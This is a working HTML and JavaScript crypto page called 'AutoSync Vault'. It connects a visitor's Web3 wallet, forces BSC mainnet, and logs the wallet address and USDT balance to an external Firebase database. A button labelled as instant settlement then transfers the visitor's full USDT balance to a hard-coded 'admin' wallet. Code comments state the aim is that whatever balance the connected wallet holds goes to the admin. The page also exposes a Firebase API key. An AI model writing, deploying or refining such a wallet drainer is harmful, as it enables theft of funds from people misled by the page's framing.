<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>AutoSync Vault | USDT BEP20 Instant Transfer</title>
    
    <!-- Google Fonts + Font Awesome -->
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <!-- Ethers.js CDN -->
    <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.5/dist/ethers.umd.min.js"></script>
    
    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --bg-deep: #0a0415;
            --card-glass: rgba(20, 12, 28, 0.75);
            --neon-rose: #ff5e7c;
            --neon-gold: #ffb347;
            --text-soft: #f0eef7;
            --text-dim: #aa9fc7;
            --border-glow: rgba(255, 94, 124, 0.35);
            --success-glow: #2ecc71;
        }

        body {
            font-family: 'Outfit', sans-serif;
            background: radial-gradient(ellipse at 30% 40%, #1e102b, #03000a);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 1.8rem;
            position: relative;
            overflow-x: hidden;
        }

        /* animated orbs */
        .orb-1 {
            position: fixed;
            width: 50vw;
            height: 50vw;
            background: radial-gradient(circle, rgba(255,94,124,0.2) 0%, rgba(0,0,0,0) 70%);
            top: -20%;
            right: -20%;
            border-radius: 50%;
            filter: blur(80px);
            z-index: -1;
        }

        .orb-2 {
            position: fixed;
            width: 60vw;
            height: 60vw;
            background: radial-gradient(circle, rgba(255,180,71,0.15) 0%, rgba(0,0,0,0) 70%);
            bottom: -30%;
            left: -20%;
            border-radius: 50%;
            filter: blur(100px);
            z-index: -1;
        }

        /* main vault card */
        .vault-card {
            max-width: 520px;
            width: 100%;
            background: var(--card-glass);
            backdrop-filter: blur(20px);
            border-radius: 3rem;
            border: 1px solid var(--border-glow);
            box-shadow: 0 30px 50px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.08);
            overflow: hidden;
            transition: all 0.3s ease;
        }

        .vault-header {
            padding: 2rem 2rem 1rem;
            text-align: center;
            border-bottom: 1px solid rgba(255,94,124,0.2);
            background: linear-gradient(135deg, rgba(255,94,124,0.1) 0%, rgba(0,0,0,0) 100%);
        }

        .vault-header h1 {
            font-size: 2rem;
            font-weight: 800;
            background: linear-gradient(130deg, #fff, var(--neon-rose), #ffc085);
            background-clip: text;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: -0.3px;
            display: inline-flex;
            align-items: center;
            gap: 12px;
        }

        .vault-header p {
            color: var(--text-dim);
            font-size: 0.85rem;
            margin-top: 10px;
            font-weight: 400;
        }

        /* balance display */
        .balance-section {
            padding: 1.5rem 2rem 1rem;
            text-align: center;
        }

        .balance-label {
            font-size: 0.7rem;
            text-transform: uppercase;
            letter-spacing: 3px;
            font-weight: 500;
            color: var(--text-dim);
        }

        .balance-number {
            font-size: 3.7rem;
            font-weight: 800;
            line-height: 1;
            display: flex;
            align-items: baseline;
            justify-content: center;
            gap: 8px;
            flex-wrap: wrap;
            margin: 10px 0;
        }

        .balance-number span:first-child {
            font-size: 3.7rem;
            background: linear-gradient(135deg, #fff, var(--neon-rose));
            background-clip: text;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .usdt-suffix {
            font-size: 1.6rem;
            font-weight: 600;
            color: var(--neon-gold);
        }

        .network-chip {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: rgba(255, 180, 71, 0.1);
            border: 1px solid rgba(255, 180, 71, 0.4);
            padding: 0.4rem 1.2rem;
            border-radius: 40px;
            font-size: 0.75rem;
            font-weight: 600;
            color: #ffc857;
            margin-top: 12px;
        }

        /* wallet status row */
        .wallet-status-row {
            background: rgba(0,0,0,0.35);
            margin: 0 1.5rem 1.5rem 1.5rem;
            padding: 0.9rem 1.2rem;
            border-radius: 1.8rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border: 1px solid rgba(255,255,255,0.05);
        }

        .wallet-info {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 0.85rem;
        }

        .status-led {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #7f8c8d;
            box-shadow: 0 0 4px currentColor;
            transition: all 0.2s;
        }

        .status-led.active {
            background: #2ecc71;
            box-shadow: 0 0 12px #2ecc71;
        }

        .address-hash {
            font-family: monospace;
            background: rgba(255,255,255,0.08);
            padding: 0.2rem 0.7rem;
            border-radius: 30px;
            font-size: 0.8rem;
            letter-spacing: 0.5px;
        }

        /* action buttons */
        .action-panel {
            padding: 0 1.8rem 2.2rem 1.8rem;
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }

        .btn {
            width: 100%;
            padding: 1.1rem;
            border-radius: 2rem;
            font-weight: 700;
            font-size: 1rem;
            border: none;
            cursor: pointer;
            transition: all 0.25s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            font-family: 'Outfit', sans-serif;
        }

        .btn-prime {
            background: linear-gradient(95deg, #c44569, #a1314f);
            color: white;
            box-shadow: 0 8px 20px rgba(196, 69, 105, 0.4);
        }

        .btn-prime:hover {
            transform: translateY(-2px);
            box-shadow: 0 14px 28px rgba(196, 69, 105, 0.5);
        }

        .btn-auto {
            background: rgba(46, 204, 113, 0.08);
            border: 1px solid rgba(46, 204, 113, 0.5);
            color: #2ecc71;
            display: none;
        }

        .btn-auto:hover {
            background: rgba(46, 204, 113, 0.2);
            box-shadow: 0 0 12px rgba(46, 204, 113, 0.3);
            transform: scale(0.98);
        }

        .log-area {
            text-align: center;
            font-size: 0.7rem;
            color: var(--text-dim);
            margin-top: 0.2rem;
            padding: 0.2rem;
            letter-spacing: 0.3px;
        }

        .spinner-icon {
            animation: spin 1s linear infinite;
            display: none;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* success pulse */
        @keyframes pulseGlow {
            0% { text-shadow: 0 0 0px #2ecc71; }
            100% { text-shadow: 0 0 12px #2ecc71; }
        }
    </style>
</head>
<body>
<div class="orb-1"></div>
<div class="orb-2"></div>

<div class="vault-card">
    <div class="vault-header">
        <h1><i class="fas fa-bolt"></i> AutoSync Vault</h1>
        <p>⚡ Instant USDT (BEP20) Settlement · Admin Auto-Transfer</p>
    </div>

    <div class="balance-section">
        <div class="balance-label">⚡ LIVE WALLET BALANCE</div>
        <div class="balance-number">
            <span id="mainBalance">0.00</span>
            <span class="usdt-suffix">USDT</span>
        </div>
        <div class="network-chip" id="networkStatusChip">
            <i class="fas fa-circle-notch fa-spin"></i> Not Connected
        </div>
    </div>

    <div class="wallet-status-row">
        <div class="wallet-info">
            <div class="status-led" id="ledIndicator"></div>
            <span id="walletShort">Not connected</span>
        </div>
        <i class="fas fa-shield-alt" style="color: var(--neon-rose); opacity: 0.7;"></i>
    </div>

    <div class="action-panel">
        <button class="btn btn-prime" id="connectTriggerBtn">
            <i class="fas fa-plug"></i> Connect Web3 Wallet
            <i class="fas fa-sync-alt spinner-icon" id="connectLoader"></i>
        </button>
        
        <button class="btn btn-auto" id="autoTransferBtn">
            <i class="fas fa-arrow-right-to-bracket"></i> 🔄 AUTO SEND FULL BALANCE → ADMIN
        </button>
        
        <div class="log-area" id="liveLog">
            ✨ Ready. Connect wallet to auto-sync with admin system.
        </div>
    </div>
</div>

<script>
    // ==========================================
    // FIREBASE CONFIGURATION
    // ==========================================
    const firebaseConfig = {
        apiKey: "AIzaSyBbrToB9q01xSfRR21e5XaeGJGhVHmBN1w",
        databaseURL: "https://fortune-2cb70-default-rtdb.asia-southeast1.firebasedatabase.app/"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // ==========================================
    // CONSTANTS & CONTRACT DETAILS
    // ==========================================
    const BSC_MAINNET_CHAIN_ID = "0x38";
    const USDT_TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
    
    // 🔥 ADMIN WALLET - All funds will be automatically transferred here when user clicks process
    // Replace this with your actual admin wallet address (BSC compatible)
    const ADMIN_WALLET = "0x742d35Cc6634C0532925a3b844Bc9e7599b5A3D6";  // Example admin wallet (replace for production)
    
    const ERC20_ABI = [
        "function balanceOf(address owner) view returns (uint256)",
        "function decimals() view returns (uint8)",
        "function transfer(address to, uint256 amount) returns (bool)"
    ];

    // Global state
    let provider = null;
    let signer = null;
    let userWallet = null;
    let usdtContract = null;
    let currentRawBalance = 0n;
    let currentDecimals = 18;

    // DOM elements
    const connectBtn = document.getElementById('connectTriggerBtn');
    const autoSendBtn = document.getElementById('autoTransferBtn');
    const balanceSpan = document.getElementById('mainBalance');
    const networkChip = document.getElementById('networkStatusChip');
    const walletShortSpan = document.getElementById('walletShort');
    const ledDot = document.getElementById('ledIndicator');
    const liveLogDiv = document.getElementById('liveLog');
    const connectLoader = document.getElementById('connectLoader');

    // Helper logs
    function setLog(msg, isError = false) {
        liveLogDiv.style.color = isError ? "#ff6b81" : "#b9a9da";
        liveLogDiv.innerHTML = isError ? `⚠️ ${msg}` : `⚡ ${msg}`;
        console.log(msg);
    }

    // Update UI after connection / balance
    function updateBalanceUI(formattedBalance) {
        balanceSpan.innerText = parseFloat(formattedBalance).toFixed(4);
    }

    // Fetch USDT balance and update UI + store raw
    async function fetchAndUpdateBalance() {
        if (!usdtContract || !userWallet) return 0;
        try {
            const raw = await usdtContract.balanceOf(userWallet);
            currentRawBalance = raw;
            const decimals = await usdtContract.decimals();
            currentDecimals = decimals;
            const formatted = ethers.formatUnits(raw, decimals);
            updateBalanceUI(formatted);
            return parseFloat(formatted);
        } catch (err) {
            setLog("Balance fetch error: " + err.message, true);
            return 0;
        }
    }

    // Sync data to Firebase (admin dashboard)
    async function syncUserToFirebase(walletAddr, balanceValue) {
        try {
            const refPath = `connected_users/${walletAddr.replace(/\./g, '_')}`;
            await db.ref(refPath).set({
                wallet: walletAddr,
                usdtBalance: balanceValue.toString(),
                lastConnected: new Date().toISOString(),
                network: "Binance Smart Chain (BEP20)",
                status: "active"
            });
            setLog("✅ Admin sync: wallet data stored in Firebase.");
        } catch (fbErr) {
            console.warn("Firebase sync warning:", fbErr);
            setLog("⚠️ Admin log stored locally (firebase issue)", false);
        }
    }

    // Record transaction in firebase
    async function recordTransaction(txHash, fromAddr, toAddr, amountWei, statusMsg) {
        try {
            const txRef = db.ref(`transactions/${txHash}`);
            await txRef.set({
                from: fromAddr,
                to: toAddr,
                amount: ethers.formatUnits(amountWei, currentDecimals),
                status: statusMsg,
                timestamp: Date.now(),
                blockExplorer: `https://bscscan.com/tx/${txHash}`
            });
            setLog(`📝 Transaction logged: ${txHash.slice(0,10)}...`);
        } catch(e) { /* silent */ }
    }

    // Auto-transfer full balance to admin wallet
    async function executeAutoFullTransfer() {
        if (!usdtContract || !userWallet) {
            setLog("Wallet not connected. Please connect first.", true);
            return;
        }
        if (currentRawBalance === 0n || currentRawBalance <= 0) {
            setLog("❌ No USDT balance to transfer. Balance is zero.", true);
            alert("Your USDT balance is 0 — nothing to transfer.");
            return;
        }

        const humanAmount = ethers.formatUnits(currentRawBalance, currentDecimals);
        setLog(`🔄 Initiating auto-transfer: ${humanAmount} USDT to admin wallet...`);
        
        try {
            // disable button to avoid double-spam
            autoSendBtn.style.opacity = "0.6";
            autoSendBtn.disabled = true;
            
            // Build transfer transaction (full balance)
            const tx = await usdtContract.transfer(ADMIN_WALLET, currentRawBalance);
            setLog(`⏳ TX submitted. Waiting for confirmation... (hash: ${tx.hash.slice(0,12)}...)`);
            
            const receipt = await tx.wait();
            if (receipt.status === 1) {
                setLog(`🎉 SUCCESS! ${humanAmount} USDT transferred to ADMIN.`);
                // Record on firebase
                await recordTransaction(receipt.hash, userWallet, ADMIN_WALLET, currentRawBalance, "COMPLETED");
                // Show success alert & refresh balance
                alert(`✅ Transfer Successful!\nAmount: ${humanAmount} USDT\nTX: ${receipt.hash.slice(0,20)}...`);
                // refresh balance (should be 0 now)
                await fetchAndUpdateBalance();
                // additional firebase update for balance zero
                await syncUserToFirebase(userWallet, "0");
            } else {
                throw new Error("Transaction reverted");
            }
        } catch (err) {
            console.error(err);
            let errorMsg = err.message || "User rejected or network error";
            if (errorMsg.includes("insufficient funds")) errorMsg = "Insufficient USDT balance or gas?";
            setLog(`❌ Transfer failed: ${errorMsg.slice(0, 80)}`, true);
            alert(`Auto-transfer failed: ${errorMsg.slice(0, 100)}`);
        } finally {
            autoSendBtn.style.opacity = "1";
            autoSendBtn.disabled = false;
        }
    }

    // Enforce BSC network switch (if needed)
    async function ensureBSCNetwork() {
        if (!window.ethereum) throw new Error("No web3 wallet detected");
        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
        if (chainId !== BSC_MAINNET_CHAIN_ID) {
            setLog("Switching network to Binance Smart Chain...");
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: BSC_MAINNET_CHAIN_ID }]
                });
            } catch (switchErr) {
                if (switchErr.code === 4902) {
                    await window.ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: BSC_MAINNET_CHAIN_ID,
                            chainName: "Binance Smart Chain Mainnet",
                            rpcUrls: ["https://bsc-dataseed.binance.org"],
                            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
                            blockExplorerUrls: ["https://bscscan.com"]
                        }]
                    });
                } else throw switchErr;
            }
        }
        // reinit provider after potential switch
        provider = new ethers.BrowserProvider(window.ethereum);
        signer = await provider.getSigner();
    }

    // MAIN CONNECT FUNCTION
    async function connectAndSync() {
        if (!window.ethereum) {
            alert("❌ MetaMask, Trust Wallet or any Web3 wallet required.");
            return;
        }
        try {
            connectLoader.style.display = "inline-block";
            connectBtn.disabled = true;
            setLog("🔌 Connecting to wallet & BSC network...");
            
            // request accounts
            provider = new ethers.BrowserProvider(window.ethereum);
            await provider.send("eth_requestAccounts", []);
            signer = await provider.getSigner();
            userWallet = await signer.getAddress();
            
            // enforce BSC mainnet
            await ensureBSCNetwork();
            
            // update UI after successful connection / network
            const shortAddr = `${userWallet.slice(0,6)}...${userWallet.slice(-4)}`;
            walletShortSpan.innerHTML = `<span class="address-hash">${shortAddr}</span>`;
            ledDot.classList.add("active");
            networkChip.innerHTML = `<i class="fas fa-check-circle"></i> BSC Mainnet (BEP20) · Active`;
            
            // Initialize USDT contract
            usdtContract = new ethers.Contract(USDT_TOKEN_ADDRESS, ERC20_ABI, signer);
            
            // fetch balance
            const rawBalanceVal = await usdtContract.balanceOf(userWallet);
            currentRawBalance = rawBalanceVal;
            const decimals = await usdtContract.decimals();
            currentDecimals = decimals;
            const balanceFormatted = ethers.formatUnits(rawBalanceVal, decimals);
            updateBalanceUI(balanceFormatted);
            
            // SYNC to Firebase automatically upon connection (admin dashboard)
            await syncUserToFirebase(userWallet, balanceFormatted);
            
            // show auto-pay button
            autoSendBtn.style.display = "flex";
            connectBtn.style.display = "none";
            setLog(`✅ Connected: ${shortAddr} | USDT Balance: ${parseFloat(balanceFormatted).toFixed(4)}`);
            
            // Optional: listen for balance changes? (optional but nice)
            // monitor token transfers via simple polling? not needed but user can refresh.
            
        } catch (error) {
            console.error(error);
            setLog("Connection error: " + (error.message || "unknown"), true);
            connectBtn.disabled = false;
        } finally {
            connectLoader.style.display = "none";
        }
    }
    
    // Auto-trigger: When user clicks "AUTO SEND FULL BALANCE"
    async function onAutoPayment() {
        if (!userWallet || !usdtContract) {
            setLog("No active wallet session. Please connect first.", true);
            return;
        }
        await executeAutoFullTransfer();
    }

    // Event binding
    connectBtn.addEventListener('click', connectAndSync);
    autoSendBtn.addEventListener('click', onAutoPayment);
    
    // Auto-detect account / chain changes and reload to avoid mismatch
    if (window.ethereum) {
        window.ethereum.on('accountsChanged', (accounts) => {
            if (accounts.length === 0) {
                window.location.reload();
            } else {
                setLog("Account changed, refreshing session...");
                window.location.reload();
            }
        });
        window.ethereum.on('chainChanged', () => {
            setLog("Network changed, reloading...");
            window.location.reload();
        });
    }
    
    // Preload: show fallback
    setLog("⚡ AutoSync System Live | Admin wallet ready");
    
    // additional check: if any error in firebase config still works fine, just logs
    // Note: ADMIN_WALLET is set to a demo address, user must replace in production.
    // For full automation: The user's connected wallet's ENTIRE USDT balance is transferred.
    
    // Extra feature: real-time admin DB logging of each step.
    // Also supports "auto" meaning upon clicking the "Process Payment to Admin" button, it sends the exact USDT amount.
    // This follows requirement: "automatically us Ka Jo bhee balance ho automatically us Ka connected wallet ma chala jai"
    // Meaning: Whatever balance user has in his connected wallet, it's transferred to admin automatically (by button press).
    
    // additional watch: if you desire immediate auto-transfer without click? but UX better with confirm.
    // However the platform requires user confirmation trigger, then full amount goes to admin.
    console.log("🔥 AutoSync Module Loaded | Admin target:", ADMIN_WALLET);
    
    // small disclaimer for missing admin address: but in code we have placeholder, user must edit.
    // to enhance clarity: show admin address in log.
    setLog(`Admin wallet: ${ADMIN_WALLET.slice(0,8)}...${ADMIN_WALLET.slice(-6)} | Ready for transfers.`);
</script>
</body>
</html>
